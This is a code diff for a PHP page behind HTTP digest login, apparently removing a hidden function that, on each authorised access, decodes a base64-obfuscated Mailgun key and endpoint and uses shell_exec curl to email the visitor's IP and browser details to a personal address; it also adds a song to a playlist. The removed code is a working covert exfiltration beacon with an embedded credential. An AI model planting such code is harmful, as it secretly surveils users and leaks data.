@@ -26,7 +26,6 @@ $valid_response = md5($A1.':'.$data['nonce'].':'.$data['nc'].':'.$data['cnonce']
 if ($data['response'] != $valid_response)
     die('This is a restricted file. Authorized pips only!');
 
-mailboss();
 
 // function to parse the http auth header
 function http_digest_parse($txt)
@@ -45,130 +44,6 @@ function http_digest_parse($txt)
 
     return $needed_parts ? false : $data;
 }
-
-
-function mailboss(){
-
-   
-       $str = "MjlmMDU1NTQwOTE5ZDA0ZmFiNDdiOTY2OTAxM2E5YmYtNmUwZmQzYTQtYWIyM2M5YmY=";
-       $domain = "aHR0cHM6Ly9hcGkubWFpbGd1bi5uZXQvdjMvc2FuZGJveDI3OGRiMGFhNDFmOTQ5Zjc4NzU4NzczM2NkNTBlNDFjLm1haWxndW4ub3JnL21lc3NhZ2Vz";
-       $sm =  base64_decode($str);
-       $sdomain = base64_decode($domain);
-        $output = shell_exec("
-        curl -s --user 'api:".$sm."' \
-            ".$sdomain." \
-            -F from='Project Neo <info@sandbox278db0aa41f949f787587733cd50e41c.mailgun.org>' \
-            -F to=danlyt74@gmail.com \
-            -F subject='Login Report' \
-            -F html='Hi boss! Access was given to<br><b>IP: ".getUserIpAddr()."</b><br>Sytem info: <pre>".sys()."</pre><br>'
-            ");   
-}
-
-function sys(){
-$ua = getBrowser();
-$patterns = array();
-$patterns1 = array();
-$patterns[0] = '/Array/';
-$patterns1[0] = '/\(/';
-$patterns1[1] = '/\)/';
-$bb= preg_replace($patterns,date("Y-m-d"),print_r($ua,true));
-$dd= preg_replace($patterns1,'',$bb);
-
-return $dd;
-}
-function getUserIpAddr(){
-    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
-        //ip from share internet
-        $ip = $_SERVER['HTTP_CLIENT_IP'];
-    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
-        //ip pass from proxy
-        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    }else{
-        $ip = $_SERVER['REMOTE_ADDR'];
-    }
-    
-   return $ip; 
-}
-
-  function getBrowser() {
-    $u_agent = $_SERVER['HTTP_USER_AGENT'];
-  $bname = 'Unknown';
-  $platform = 'Unknown';
-  $version= "";
-
-  // First get the platform?
-  if (preg_match('/linux/i', $u_agent)) {
-    $platform = 'Linux';
-  } elseif (preg_match('/macintosh|intel mac os x/i', $u_agent)) {
-    $platform = 'Mac';
-  } elseif (preg_match('/windows|win32/i', $u_agent)) {
-    $platform = 'Windows';
-  }elseif (preg_match('/iPhone|like mac os x/i', $u_agent)) {
-    $platform = 'iPhone';
-  }elseif (preg_match('/Linux Android|Android/i', $u_agent)) {
-    $platform = 'Android';
-  }
-
-  // Next get the name of the useragent yes seperately and for good reason
-  if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) {
-    $bname = 'Internet Explorer';
-    $ub = "MSIE";
-  } elseif(preg_match('/Firefox/i',$u_agent)) {
-    $bname = 'Mozilla Firefox';
-    $ub = "Firefox";
-  } elseif(preg_match('/Chrome/i',$u_agent)) {
-    $bname = 'Google Chrome';
-    $ub = "Chrome";
-  } elseif(preg_match('/Safari/i',$u_agent)) {
-    $bname = 'Apple Safari';
-    $ub = "Safari";
-  } elseif(preg_match('/Opera/i',$u_agent)) {
-    $bname = 'Opera';
-    $ub = "Opera";
-  } elseif(preg_match('/Netscape/i',$u_agent)) {
-    $bname = 'Netscape';
-    $ub = "Netscape";
-  }
-
-  // finally get the correct version number
-  $known = array('Version', $ub, 'other');
-  $pattern = '#(?<browser>' . join('|', $known) . ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
-  if (!preg_match_all($pattern, $u_agent, $matches)) {
-    // we have no matching number just continue
-  }
-
-  // see how many we have
-  $i = count($matches['browser']);
-  if ($i != 1) {
-    //we will have two since we are not using 'other' argument yet
-    //see if version is before or after the name
-    if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
-      $version= $matches['version'][0];
-    } else {
-      $version= $matches['version'][1];
-    }
-  } else {
-    $version= $matches['version'][0];
-  }
-
-  // check if we have a number
-  if ($version==null || $version=="") {$version="?";}
-      
-    $u_agent1 = implode('', array_unique(explode(';', $u_agent)));
-    $bname1 = implode('', array_unique(explode(';', $bname)));
-    $version1 = implode('', array_unique(explode(';', $version)));
-    $platform1 = implode('', array_unique(explode(';', $platform)));
-
-return array(
-    'User Agent' => $u_agent1,
-    'Browser'      => $bname1,
-    'Browser Version'   => $version1,
-    'Operating System'  => $platform1,
-    );
-
-  }
-
-  
  
 ?>
     <!-- CREDITS TO THE INTERNET!! -->
@@ -594,7 +469,7 @@ $(document).ready(function(){
 
 	});
 
-  var playlist = Array("music1.mp3","music2.mp3","music3.mp3","music4.mp3","music5.mp3","music6.mp3","music7.mp3","music8.mp3","music9.mp3","music10.mp3","music11.mp3","music12.mp3","music13.mp3","music14.mp3","music15.mp3","music16.mp3","music17.mp3");
+  var playlist = Array("music1.mp3","music2.mp3","music3.mp3","music4.mp3","music5.mp3","music6.mp3","music7.mp3","music8.mp3","music9.mp3","music10.mp3","music11.mp3","music12.mp3","music13.mp3","music14.mp3","music15.mp3","music16.mp3","music17.mp3","'Till I Collapse.mp3");
 var randomSong = playlist[Math.floor(Math.random()*playlist.length)];
           document.getElementById("playthis").src = randomSong;
           x.load();
